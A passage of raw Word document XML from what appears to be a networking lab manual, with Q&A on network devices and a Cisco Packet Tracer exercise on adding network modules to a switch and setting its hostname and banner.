        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Answer:Network topology is the physical or logical arrangement of devices and connections in a computer network.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1566546D" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>3. What are the basic devices used in a simple network topology?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="11C1A487" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Answer:The basic devices include:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4CD19B18" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t></w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">PCs (Personal Computers) </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2037CF92" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t></w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">Switches </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1822E471" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t></w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">Routers </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0DA272B5" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t></w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">Network cables </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C175150" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>4. What is the function of a switch in a network?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15972F73" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Answer:A switch connects multiple devices within the same local area network (LAN) and forwards data to the correct destination.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="640409E5" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>5. What is the role of a router in a network?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="09FC7C19" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Answer:A router connects different networks and routes data packets between them.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="36317FC2" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="75435FCC" w14:textId="77777777" w:rsidR="008F6290" w:rsidRDefault="008F6290" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="23FF038E" w14:textId="7AED1B75" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Ex.No:10</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="09381C68" w14:textId="5344B076" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00812B48">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>CUSTOMIZE SWITCH WITH NETWORK MODULES USING CISCO</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="48A66FA3" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00812B48">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>PACKET TRACER</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3415A059" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Aim:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3CB551E5" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>To Customize Switch with Network Modules using Cisco Packet Tracer.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="131396AF" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Procedure:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71887EE7" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>1. Open Cisco Packet Tracer</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00E9D25B" w14:textId="3CBC0BE3" w:rsidR="008F6290" w:rsidRPr="00A11CBB" w:rsidRDefault="00000000" w:rsidP="00A11CBB">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="26"/>
        </w:numPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00A11CBB">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Launch Cisco Packet Tracer on your computer.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C796120" w14:textId="2B76A021" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>2. Add a Switch to Your Workspace</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="62419780" w14:textId="1520C52E" w:rsidR="008F6290" w:rsidRPr="00A11CBB" w:rsidRDefault="00000000" w:rsidP="00A11CBB">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="26"/>
        </w:numPr>
        <w:spacing w:before="198" w:after="0" w:line="360" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00A11CBB">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>In the device toolbar (usually on the left side of the screen), locate the "Switches" section.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="778FD02E" w14:textId="253934A7" w:rsidR="0094061E" w:rsidRPr="00A11CBB" w:rsidRDefault="00000000" w:rsidP="00A11CBB">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="26"/>
        </w:numPr>
        <w:spacing w:before="198" w:after="0" w:line="360" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00A11CBB">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Drag and drop a switch model onto the workspace.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="612E6A45" w14:textId="77777777" w:rsidR="008F6290" w:rsidRDefault="008F6290" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0CBCB0F4" w14:textId="77777777" w:rsidR="008F6290" w:rsidRDefault="008F6290" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="63326075" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="6034C0C8" wp14:editId="62D4AD8B">
            <wp:extent cx="3552638" cy="171922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59"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="3552638" cy="1719223"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E379720" w14:textId="77777777" w:rsidR="008F6290" w:rsidRDefault="008F6290" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7B265269" w14:textId="77777777" w:rsidR="008F6290" w:rsidRDefault="008F6290" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1EAB4A23" w14:textId="55AD79CB" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>3. Access the Switch's Physical Layout</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F9A3F2F" w14:textId="1B839026" w:rsidR="008F6290" w:rsidRPr="00A11CBB" w:rsidRDefault="00000000" w:rsidP="00A11CBB">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="27"/>
        </w:numPr>
        <w:spacing w:before="198" w:after="0" w:line="360" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00A11CBB">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Click on the switch in the workspace to open its configuration window.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C47EE31" w14:textId="213DB056" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00A11CBB">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="27"/>
        </w:numPr>
        <w:spacing w:before="198" w:after="0" w:line="360" w:lineRule="auto"/>
      </w:pPr>
      <w:r w:rsidRPr="00A11CBB">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Navigate to the "Physical" tab to see the switch's physical layout and modules.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E89A098" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="60E2DC68" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="14129520" wp14:editId="27EFA81F">
            <wp:extent cx="5075254" cy="381278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0"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5075254" cy="3812785"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D2D51A6" w14:textId="77777777" w:rsidR="008F6290" w:rsidRDefault="008F6290" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7A2E5EEA" w14:textId="3DDD4859" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>4. Add Network Modules</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0249F2C5" w14:textId="73EE6B6C" w:rsidR="008F6290" w:rsidRPr="00A11CBB" w:rsidRDefault="00000000" w:rsidP="00A11CBB">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="28"/>
        </w:numPr>
        <w:spacing w:before="198" w:after="0" w:line="360" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00A11CBB">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>In the "Physical" tab, you might see options to add or modify network modules.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2DD0E2FA" w14:textId="1C9BFD35" w:rsidR="008F6290" w:rsidRPr="00A11CBB" w:rsidRDefault="00000000" w:rsidP="00A11CBB">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="28"/>
        </w:numPr>
        <w:spacing w:before="198" w:after="0" w:line="360" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00A11CBB">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Click on the slot where you want to add a module.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5FFC2EBE" w14:textId="274D8E2E" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00A11CBB">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="28"/>
        </w:numPr>
        <w:spacing w:before="198" w:after="0" w:line="360" w:lineRule="auto"/>
      </w:pPr>
      <w:r w:rsidRPr="00A11CBB">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Drag the module from the list of available modules and drop it into the slot on the switch.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="689A130D" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="30116948" wp14:editId="2700B597">
            <wp:extent cx="4761622" cy="3561693"/>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1"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="4761622" cy="3561693"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="79D9C65E" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="75CB556D" w14:textId="77777777" w:rsidR="008F6290" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:sz w:val="40"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:sz w:val="40"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">       </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="329BEC86" w14:textId="095DFD4E" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>5. Configure the Modules and save the configuration</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="52FAFDB0" w14:textId="1FC2512A" w:rsidR="008F6290" w:rsidRPr="00A11CBB" w:rsidRDefault="00000000" w:rsidP="00A11CBB">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="29"/>
        </w:numPr>
        <w:spacing w:before="198" w:after="0" w:line="360" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00A11CBB">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>After adding the module, switch to the "CLI" tab in the switch's configuration window.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22CDAB92" w14:textId="7CB06E34" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00A11CBB">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="29"/>
        </w:numPr>
        <w:spacing w:before="198" w:after="0" w:line="360" w:lineRule="auto"/>
      </w:pPr>
      <w:r w:rsidRPr="00A11CBB">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Here, you can configure the ports provided by the module. For example, you can set IP addresses, VLAN configurations, and other settings for the new interfaces.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="473BC02D" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>CONFIG THE HOSTNAME OF THE SWITCH:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A486AC5" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="614331CD" wp14:editId="69DA7E68">
            <wp:extent cx="5731509" cy="1377339"/>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2"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5731509" cy="1377339"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="2734DB0A" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>SET THE MESSAGE OF THE DAY(MOTD) BANNER FOR THE SWITCH:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="31C3CF72" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="7E303C10" wp14:editId="1B7D1B50">
            <wp:extent cx="5731510" cy="1726435"/>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3"/>
                    <a:stretch>
                      <a:fillRect/>
